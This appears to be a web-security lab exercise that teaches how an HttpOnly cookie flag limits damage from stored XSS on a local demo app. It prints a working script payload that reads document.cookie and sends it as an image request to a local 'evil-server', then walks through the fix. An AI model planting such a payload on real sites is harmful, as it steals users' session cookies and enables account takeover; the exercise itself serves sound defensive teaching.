# Exercise 3 — Cookie exfiltration via image beacon

## Goal

Make the session cookie useless to a script that manages to run on the page
— even though the script itself (stored XSS) is still live. That's fixed
last, in exercise 4.

## Setup

All four servers running. Log in to http://localhost:3000 as `demo`/`demo`.

## Plant the payload

Post this as a new message-board entry through the real app — you're
planting it yourself, as a normal logged-in user, not via CSRF:

```html
<script>new Image().src = 'http://127.0.0.1:5000/beacon.png?c=' + encodeURIComponent(document.cookie);</script>
```

## Watch the attack succeed

1. Reload http://localhost:3000 (or click Refresh). The board renders
   entries without sanitizing them, so your planted `<script>` runs.
2. It reads `document.cookie` and sends it to evil-server as an image
   request.
3. Check http://127.0.0.1:5000/captured — a `beacon-hit` entry shows the
   captured cookie value. It should contain your real session cookie
   (`dummy-verify-string:...`).

## Why this works

`demo/servers/login-server/headers.js` sets the cookie without `HttpOnly`,
so any JavaScript that runs on the page — including injected/stored script —
can read the raw cookie value via `document.cookie`.

## Fix it

Edit `demo/servers/login-server/headers.js`:

```js
httpOnly: true,
```

Restart `login-server` (or the whole stack), then **log in again**.

## Confirm the fix

1. Reload http://localhost:3000 again — the planted `<script>` tag **still
   runs** (CSP isn't fixed yet — that's exercise 4), and the beacon request
   still fires.
2. Check http://127.0.0.1:5000/captured — the new `beacon-hit` entry shows
   an **empty** captured value. The script ran, but `document.cookie` no
   longer contains the session cookie at all.

## Key takeaway

`HttpOnly` doesn't stop XSS from happening — it limits the *damage* a
successful XSS can do to this one cookie. It's defense-in-depth, not a fix
for the root cause. The root cause (the script runs at all) is exercise 4.
